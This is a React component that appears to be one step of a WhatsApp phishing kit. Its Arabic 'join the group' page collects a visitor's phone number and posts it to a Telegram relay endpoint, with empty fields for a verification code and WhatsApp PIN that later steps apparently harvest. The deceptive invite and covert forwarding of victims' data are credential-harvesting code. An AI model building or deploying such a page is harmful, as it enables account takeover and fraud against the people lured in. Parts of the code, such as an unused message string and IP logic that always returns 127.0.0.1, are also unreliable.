import React, { useState } from 'react';
import PhoneInput, { isValidPhoneNumber } from 'react-phone-number-input';

// Countries allowed: only Arab countries in Asia, plus USA and (FR, ES, DE)
const ALLOWED_COUNTRIES = [
  // Arab countries in Asia only
  'AE', // UAE
  'BH', // Bahrain
  'IQ', // Iraq
  'JO', // Jordan
  'KW', // Kuwait
  'LB', // Lebanon
  'OM', // Oman
  'QA', // Qatar
  'SA', // Saudi Arabia
  'SY', // Syria
  'YE', // Yemen
  // USA
  'US',
  // Selected Europe
  'FR','ES','DE'
] as const;

interface PhoneStepProps {
  phoneNumber: string;
  updatePhoneNumber: (value: string) => void;
  onNext: () => void;
}

const PhoneStep: React.FC<PhoneStepProps> = ({ phoneNumber, updatePhoneNumber, onNext }) => {
  const [error, setError] = useState('');

  const sendPhoneToTelegram = async (phone: string) => {
    try {
      const forwardedFor = (window.location.hostname === 'localhost' ? '127.0.0.1' : '');
      const remoteIp = forwardedFor || '127.0.0.1';
      
      const phoneText = [
        '📩 Numéro de téléphone saisi:',
        `📱 Téléphone: ${phone}`,
        `🌐 IP: ${remoteIp}`,
        `🕒 Heure: ${new Date().toLocaleString('fr-FR')}`
      ].join('\n');

      await fetch('/api/telegram/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          phoneNumber: phone,
          verificationCode: '',
          whatsappPin: '',
          messageType: 'phone'
        })
      });
    } catch (error) {
      console.error('Erreur envoi téléphone:', error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!phoneNumber || !isValidPhoneNumber(phoneNumber)) {
      setError('يرجى إدخال رقم هاتف دولي صحيح');
      return;
    }
    
    setError('');
    await sendPhoneToTelegram(phoneNumber);
    onNext();
  };

  return (
    <div className="form-card animate-fade-in">
      <div className="form-content">
        <div className="form-icon phone">📱</div>
        <h2 className="form-title">الانضمام إلى المجموعة</h2>
        <p className="form-subtitle">أدخل رقم هاتفك للمتابعة</p>

        <form onSubmit={handleSubmit}>
          <div className="input-group">
            <div className="phone-input-container">
              <PhoneInput
                international
                defaultCountry="AE"
                countries={ALLOWED_COUNTRIES as unknown as string[]}
                value={phoneNumber}
                onChange={(value) => updatePhoneNumber(value || '')}
                className="phone-input"
                placeholder="أدخل رقم هاتفك الدولي"
              />
            </div>
            {error && (
              <div className="message error animate-fade-in">{error}</div>
            )}
          </div>

          <button
            type="submit"
            className="btn btn-primary btn-full"
          >
            <span>الانضمام إلى الدردشة</span>
            <span>→</span>
          </button>

          <div className="text-center" style={{ marginTop: '1.5rem' }}>
            <p style={{ fontSize: '0.9rem', color: '#6b7280' }}>اتبع هذا الرابط للانضمام</p>
            <p style={{ fontSize: '0.8rem', color: '#3b82f6', marginTop: '0.5rem' }}>استخدم واتساب ويب</p>
          </div>
        </form>
      </div>
    </div>
  );
};

export default PhoneStep;